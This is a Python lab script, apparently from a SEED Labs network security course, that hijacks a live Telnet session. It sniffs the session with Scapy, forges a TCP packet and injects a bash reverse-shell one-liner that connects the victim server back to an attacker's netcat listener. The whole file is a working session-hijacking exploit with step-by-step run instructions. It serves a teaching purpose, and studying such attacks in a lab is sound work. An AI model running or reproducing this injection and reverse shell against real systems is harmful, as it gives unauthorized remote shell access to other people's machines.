#!/usr/bin/env python3
"""
Task 4 — Creating a Reverse Shell using TCP Session Hijacking
Author: Naga Jyothi Mahankali
Course: Network Security — SEED Labs

How it works:
  Extends Task 3.  Instead of running a single command, the injected payload
  opens a reverse shell back to the attacker machine.

  Step 1 — Start a netcat listener on the ATTACKER machine FIRST:
              nc -lnvp 9090

  Step 2 — Run this script on the ATTACKER container.

  Step 3 — The script waits for a live Telnet packet, then injects a bash
           reverse-shell one-liner into the victim server.

  Step 4 — The victim's bash connects back to the attacker on port 9090.
           The attacker now has an interactive shell on the victim machine.

Usage:
  # Terminal 1 (attacker) — start listener
  nc -lnvp 9090

  # Terminal 2 (attacker) — run this script
  python3 reverse_shell.py
"""

from scapy.all import *

# ── Configuration ──────────────────────────────────────────────────────────────
VICTIM_IP    = "10.9.0.5"   # Telnet server (target for reverse shell)
USER1_IP     = "10.9.0.6"   # Telnet client (being impersonated)
ATTACKER_IP  = "10.9.0.105" # Attacker's IP — reverse shell connects HERE
ATTACKER_PORT = 9090         # Port where netcat listener is running
TELNET_PORT  = 23
INTERFACE    = "br-"         # Change to actual bridge interface
# ───────────────────────────────────────────────────────────────────────────────

# Reverse shell payload — bash connects back to attacker
# \n simulates Enter; the shell runs silently in background (&)
REVERSE_SHELL = (
    f"/bin/bash -i > /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} "
    f"0<&1 2>&1\n"
).encode()

injected = False

def inject_reverse_shell(pkt):
    global injected
    if injected:
        return

    if not (pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt.haslayer(Raw)):
        return

    ip  = pkt[IP]
    tcp = pkt[TCP]

    if ip.src != USER1_IP or ip.dst != VICTIM_IP:
        return
    if tcp.dport != TELNET_PORT:
        return

    print(f"[*] Sniffed live Telnet packet — hijacking session...")
    print(f"    {ip.src}:{tcp.sport} → {ip.dst}:{tcp.dport}  "
          f"seq={tcp.seq}  ack={tcp.ack}")

    new_seq = tcp.ack
    new_ack = tcp.seq + len(tcp.payload)

    forged_ip  = IP(src=USER1_IP, dst=VICTIM_IP)
    forged_tcp = TCP(sport=tcp.sport, dport=TELNET_PORT,
                     flags="PA",
                     seq=new_seq,
                     ack=new_ack)
    forged_pkt = forged_ip / forged_tcp / REVERSE_SHELL

    send(forged_pkt, verbose=0)
    print(f"[!] Reverse shell payload injected!")
    print(f"[!] Check your netcat listener on port {ATTACKER_PORT}...")
    injected = True


bpf_filter = (f"tcp and src host {USER1_IP} and dst host {VICTIM_IP} "
              f"and dst port {TELNET_PORT}")

print("=" * 60)
print("  TCP Session Hijacking — Reverse Shell Injector")
print("=" * 60)
print(f"[*] Make sure 'nc -lnvp {ATTACKER_PORT}' is running first!")
print(f"[*] Waiting for live Telnet packet to hijack...\n")

sniff(iface=INTERFACE, filter=bpf_filter, prn=inject_reverse_shell)
